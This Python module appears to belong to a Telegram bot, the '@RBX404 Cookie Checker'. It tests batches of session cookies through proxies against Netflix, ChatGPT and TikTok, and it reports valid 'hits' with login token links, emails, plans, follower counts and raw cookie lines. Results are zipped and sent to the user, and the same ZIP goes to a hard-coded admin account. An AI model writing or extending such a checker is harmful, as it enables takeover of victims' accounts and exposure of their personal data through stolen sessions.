import os
import time
import shutil
import zipfile
import tempfile
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from HOME import state
from HOME.helpers import (
    bold, italic, mono, make_progress_bar,
    E_FIRE, E_STOP, E_FILE, E_GEAR, E_CROSS, E_USER, E_PIN, E_CHART,
    E_CLOCK, E_CHECK, E_PARTY, E_BOLT, E_RED, E_YELLOW, E_GREEN,
    E_PURPLE, E_ORANGE, E_DIAMOND, E_ROCKET
)
from API.cookie_engine import (
    check_netflix_cookie, check_chatgpt_cookie, check_tiktok_cookie,
    format_hit_netflix, format_hit_chatgpt, format_hit_tiktok,
    _format_number,
)
from CONFIG.config import ADMIN_ID, COOKIES_THREADS

SERVICE_LABELS = {
    "netflix": "🎬 Netflix",
    "chatgpt": "🤖 ChatGPT",
    "tiktok": "🎵 TikTok",
}


# ─── Per-cookie worker ────────────────────────────────────────────────────────

def _process_one(cs, source: str, cookies_dict: dict):
    st = cs.stats

    # Dedup by session keys
    uid_key = "|".join(f"{k}:{v[:40]}" for k, v in sorted(cookies_dict.items()) if 'session' in k.lower() or k in ('oai-sc', 'sessionid', 'sid_tt', 'NetflixId'))
    if not uid_key:
        uid_key = "|".join(f"{k}:{v[:30]}" for k, v in sorted(cookies_dict.items())[:3])
    with cs.seen_lock:
        if uid_key in cs.seen:
            with st.lock:
                st.checked += 1
            return
        cs.seen.add(uid_key)

    svc = cs.service
    px_list = cs.proxies

    if svc == "netflix":
        result, status = check_netflix_cookie(cookies_dict, px_list)
        content, filename = format_hit_netflix(result, cookies_dict, source) if result else (None, None)
    elif svc == "chatgpt":
        result, status = check_chatgpt_cookie(cookies_dict, px_list)
        content, filename = format_hit_chatgpt(result, cookies_dict, source) if result else (None, None)
    elif svc == "tiktok":
        result, status = check_tiktok_cookie(cookies_dict, px_list)
        content, filename = format_hit_tiktok(result, cookies_dict, source) if result else (None, None)
    else:
        result, status, content, filename = None, 'error', None, None

    with st.lock:
        st.checked += 1
        if status == 'valid':
            if svc == "chatgpt" and not (result or {}).get('is_paid'):
                st.free += 1
                st.free_list.append((source, result, cookies_dict, content, filename))
            else:
                st.hits += 1
                st.hits_list.append((source, result, cookies_dict, content, filename))
        elif status == 'expired':
            st.bad += 1
            st.bad_list.append(source)
        elif status == 'proxy_error':
            st.proxy_err += 1
            st.errors += 1
            st.error_list.append(source)
        else:
            st.errors += 1
            st.error_list.append(source)

    if status == 'valid' and result:
        _send_live_hit(cs, source, result, cookies_dict, content or "")


# ─── Live hit notification ────────────────────────────────────────────────────

def _send_live_hit(cs, source: str, result: dict, cookies_dict: dict, content: str):
    try:
        svc = cs.service
        svc_label = SERVICE_LABELS.get(svc, svc.upper())

        if svc == "netflix":
            token = result.get('token', 'N/A')
            token_short = token[:40] + "..." if len(token) > 40 else token
            details = (f"🎫 {bold('NFToken:')} {mono(token_short)}\n"
                       f"🔗 {bold('Link:')} {result.get('link', 'N/A')}")
        elif svc == "chatgpt":
            plan = result.get('plan', 'N/A')
            paid_badge = "💎 PREMIUM" if result.get('is_paid') else "🆓 FREE"
            details = (f"👤 {bold('Name:')} {mono(result.get('name', 'N/A'))}\n"
                       f"📧 {bold('Email:')} {mono(result.get('email', 'N/A'))}\n"
                       f"💳 {bold('Plan:')} {mono(plan)} {paid_badge}\n"
                       f"🌍 {bold('Country:')} {mono(result.get('country', 'N/A'))}")
        elif svc == "tiktok":
            username = result.get('username', 'N/A')
            details = (f"👤 {bold('Username:')} {mono('@' + username)}\n"
                       f"📛 {bold('Nickname:')} {mono(result.get('nickname', 'N/A'))}\n"
                       f"👥 {bold('Followers:')} {mono(_format_number(result.get('followers', 0)))}\n"
                       f"❤️ {bold('Likes:')} {mono(_format_number(result.get('likes', 0)))}\n"
                       f"🎬 {bold('Videos:')} {mono(str(result.get('videos', 0)))}\n"
                       f"🔗 {bold('Profile:')} {result.get('profile', '')}")
        else:
            details = ""

        # Only actual cookie lines (domain entries), no comments
        netscape_lines = [ln for ln in content.split('\n') if ln.strip().startswith('.')]
        netscape_block = "\n".join(netscape_lines[:12])

        msg = (f"🔥 {bold(f'HIT! [{svc_label}]')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"{details}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"📁 {bold('Source:')} {mono(source)}\n"
               f"{E_GEAR} {italic('Dev: @RBX404')}")

        if netscape_block:
            msg += f"\n\n<pre>{netscape_block}</pre>"

        chat_id = getattr(cs, 'chat_id', None)
        if chat_id:
            state.bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)
    except:
        pass


# ─── Status / Summary messages ────────────────────────────────────────────────

def _build_status_msg(cs) -> str:
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    eta_s = ((st.total - st.checked) / (st.checked / elapsed)) if st.checked > 0 and elapsed > 0 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    eta_str = time.strftime("%H:%M:%S", time.gmtime(eta_s)) if eta_s > 0 else "--:--:--"
    bar = make_progress_bar(st.checked, st.total, 20)
    svc_label = SERVICE_LABELS.get(cs.service, cs.service.upper())

    if cs.service == "tiktok":
        hit_row = f"{E_FIRE} {bold('Hits:')} {mono(str(st.hits))}"
    elif cs.service == "chatgpt":
        hit_row = (f"💎 {bold('Premium:')} {mono(str(st.hits))}\n"
                   f"{E_GREEN} {bold('Free:')} {mono(str(st.free))}")
    else:
        hit_row = f"💎 {bold('Premium:')} {mono(str(st.hits))}"

    return f"""{E_ROCKET} {bold(f'Cookie Checker — {svc_label}')}
{E_GEAR} {italic('Dev: @RBX404')}

{E_CHART} {bold('Progress:')}
{mono(bar)}
{mono(f'{st.checked}/{st.total}')} | {E_BOLT} CPM: {mono(str(cpm))}
{E_CLOCK} {mono(el_str)} | ETA: {mono(eta_str)}

{hit_row}
━━━━━━━━━━━━━━━━━━━━━━━━
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('Errors:')} {mono(str(st.errors))}
{E_PURPLE} {bold('Proxy Err:')} {mono(str(st.proxy_err))}   {E_ORANGE} {bold('Retries:')} {mono(str(st.retries))}
━━━━━━━━━━━━━━━━━━━━━━━━
{E_GEAR} {italic('Dev: @RBX404')}"""


def _build_summary_msg(cs, stopped=False) -> str:
    st = cs.stats
    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    el_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    svc_label = SERVICE_LABELS.get(cs.service, cs.service.upper())
    status_text = f"{E_STOP} Stopped by user" if stopped else f"{E_CHECK} Completed"

    if cs.service == "tiktok":
        result_line = f"{E_FIRE} {bold('Hits:')} {mono(str(st.hits))}"
    elif cs.service == "chatgpt":
        result_line = (f"💎 {bold('Premium:')} {mono(str(st.hits))}\n"
                       f"{E_GREEN} {bold('Free:')} {mono(str(st.free))}")
    else:
        result_line = f"💎 {bold('Premium:')} {mono(str(st.hits))}"

    return f"""{E_PARTY} {bold(f'Cookie Checker — {svc_label} — Summary')}
{E_GEAR} {italic('Dev: @RBX404')}

{bold('Status:')} {status_text}

{E_CHART} {bold('Stats:')}
{mono(f'Total Cookies: {st.total}')}
{mono(f'Checked: {st.checked}')}
{mono(f'CPM: {cpm}')}
{mono(f'Duration: {el_str}')}

{result_line}
━━━━━━━━━━━━━━━━━━━━━━━━
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('Errors:')} {mono(str(st.errors))}
{E_PURPLE} {bold('Proxy Err:')} {mono(str(st.proxy_err))}

{E_GEAR} {italic('Dev: @RBX404')}"""


# ─── Result ZIP builder ───────────────────────────────────────────────────────

def _build_result_zip(cs, user=None) -> tuple:
    st = cs.stats
    svc = cs.service
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tmpdir = tempfile.mkdtemp(prefix="ck_")
    odir = os.path.join(tmpdir, f"cookie_results_{svc}_{ts}")

    hit_folder = "hits" if svc == "tiktok" else "premium"
    hit_dir = os.path.join(odir, hit_folder)
    bad_dir = os.path.join(odir, "bad")
    err_dir = os.path.join(odir, "errors")
    for d in [hit_dir, bad_dir, err_dir]:
        os.makedirs(d, exist_ok=True)

    def _write_entries(entries, folder):
        used = set()
        for (src, result, cookies_dict, content, filename) in entries:
            if not content or not filename:
                continue
            fn = filename
            base, ext = os.path.splitext(fn)
            counter = 1
            while fn in used:
                fn = f"{base}_{counter}{ext}"
                counter += 1
            used.add(fn)
            try:
                with open(os.path.join(folder, fn), 'w', encoding='utf-8') as f:
                    f.write(content)
            except:
                pass

    _write_entries(st.hits_list, hit_dir)

    if svc == "chatgpt" and st.free_list:
        free_dir = os.path.join(odir, "free")
        os.makedirs(free_dir, exist_ok=True)
        _write_entries(st.free_list, free_dir)

    with open(os.path.join(bad_dir, "bad_cookies.txt"), 'w', encoding='utf-8') as f:
        f.write("\n".join(st.bad_list))
    with open(os.path.join(err_dir, "error_cookies.txt"), 'w', encoding='utf-8') as f:
        f.write("\n".join(st.error_list))

    elapsed = time.time() - cs.started
    cpm = int((st.checked / elapsed) * 60) if elapsed > 1 else 0
    checked_by = "N/A"
    checked_by_link = ""
    if user:
        checked_by = (f"{user.first_name or ''} {user.last_name or ''}".strip() or "User")
        checked_by_link = f"@{user.username}" if user.username else f"tg://user?id={user.id}"

    svc_label = SERVICE_LABELS.get(svc, svc.upper())
    hit_label = "Hits" if svc == "tiktok" else "Premium"
    summary_lines = [
        f"RBX404 Cookie Checker — {svc_label} Summary",
        "", "Dev: @RBX404", "",
        f"Checked by: {checked_by} ({checked_by_link})",
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "",
        f"Total Cookies : {st.total}",
        f"Checked       : {st.checked}",
        f"CPM           : {cpm}",
        f"Duration      : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}", "",
        "--- RESULTS ---",
        f"{hit_label}  : {st.hits}",
    ]
    if svc == "chatgpt":
        summary_lines.append(f"Free      : {st.free}")
    summary_lines += [
        f"Bad       : {st.bad}",
        f"Errors    : {st.errors}",
        f"Proxy Err : {st.proxy_err}",
    ]
    with open(os.path.join(odir, "summary.txt"), 'w', encoding='utf-8') as f:
        f.write("\n".join(summary_lines))

    zip_path = os.path.join(tmpdir, f"cookie_{svc}_{ts}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(odir):
            for file in files:
                fp = os.path.join(root, file)
                zf.write(fp, os.path.relpath(fp, tmpdir))

    return zip_path, tmpdir


# ─── Main runner ─────────────────────────────────────────────────────────────

def run_cookie_checker(cs, message, user):
    chat_id = message.chat.id
    cs.chat_id = chat_id

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"ck_get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop",    callback_data=f"ck_stop_{cs.user_id}")
    )

    status_msg = state.bot.send_message(
        chat_id, _build_status_msg(cs),
        parse_mode="HTML", reply_to_message_id=message.message_id,
        reply_markup=markup, disable_web_page_preview=True
    )
    cs.msg_id = status_msg.message_id

    def updater():
        while not cs.finished and not cs.stop_event.is_set():
            try:
                m2 = types.InlineKeyboardMarkup(row_width=2)
                m2.add(
                    types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"ck_get_hits_{cs.user_id}"),
                    types.InlineKeyboardButton(f"{E_STOP} Stop",    callback_data=f"ck_stop_{cs.user_id}")
                )
                state.bot.edit_message_text(
                    _build_status_msg(cs),
                    chat_id=chat_id, message_id=cs.msg_id,
                    parse_mode="HTML", reply_markup=m2, disable_web_page_preview=True
                )
            except:
                pass
            time.sleep(3)

    threading.Thread(target=updater, daemon=True).start()

    executor = ThreadPoolExecutor(max_workers=COOKIES_THREADS, thread_name_prefix="ckchk")
    cs.executor = executor
    try:
        futures = []
        for source, cookies_dict in cs.cookie_files:
            if cs.stop_event.is_set():
                break
            futures.append(executor.submit(_process_one, cs, source, cookies_dict))
        cs.futures = futures

        for f in as_completed(futures):
            if cs.stop_event.is_set():
                for fut in futures:
                    fut.cancel()
                try:
                    executor.shutdown(wait=False, cancel_futures=True)
                except TypeError:
                    executor.shutdown(wait=False)
                break
            try:
                f.result(timeout=0.1)
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            executor.shutdown(wait=False)
        except Exception:
            pass

    cs.finished = True
    stopped = cs.stop_event.is_set()

    # Send summary immediately
    try:
        state.bot.edit_message_text(
            _build_summary_msg(cs, stopped),
            chat_id=chat_id, message_id=cs.msg_id,
            parse_mode="HTML", disable_web_page_preview=True
        )
    except Exception:
        pass

    # Send zip in daemon thread — prevents stuck-at-100% hangs
    def _send_results():
        try:
            zip_path, tmpdir = _build_result_zip(cs, user=user)
            svc_label = SERVICE_LABELS.get(cs.service, cs.service.upper())
            with open(zip_path, 'rb') as f:
                state.bot.send_document(
                    chat_id, f,
                    caption=f"{E_FILE} {bold(f'Cookie Results [{svc_label}]')} | {italic('Dev: @RBX404')}",
                    parse_mode="HTML", reply_to_message_id=message.message_id
                )
            with open(zip_path, 'rb') as f:
                user_profile_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
                user_name = (f"{user.first_name or ''} {user.last_name or ''}".strip() or "User")
                st = cs.stats
                hit_label = "Hits" if cs.service == "tiktok" else "Premium"
                admin_cap = (
                    f"{E_FILE} {bold(f'Cookie Check Completed [{svc_label}]')}\n"
                    f"{E_USER} Checked by: <a href=\"{user_profile_link}\">{user_name}</a>\n"
                    f"{E_PIN} User ID: {mono(str(user.id))}\n"
                    f"{E_CHART} Cookies: {mono(str(st.total))} | {hit_label}: {mono(str(st.hits))}\n"
                    f"{E_CLOCK} Duration: {mono(time.strftime('%H:%M:%S', time.gmtime(time.time() - cs.started)))}\n"
                    f"{E_GEAR} {italic('Dev: @RBX404')}"
                )
                state.bot.send_document(ADMIN_ID, f, caption=admin_cap, parse_mode="HTML")
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass
        except Exception as e:
            try:
                state.bot.send_message(chat_id, f"{E_CROSS} Error sending results: {mono(str(e))}", parse_mode="HTML")
            except Exception:
                pass

    threading.Thread(target=_send_results, daemon=True).start()

    with state.active_checks_lock:
        ck_key = f"ck_{cs.user_id}"
        if ck_key in state.active_checks:
            del state.active_checks[ck_key]
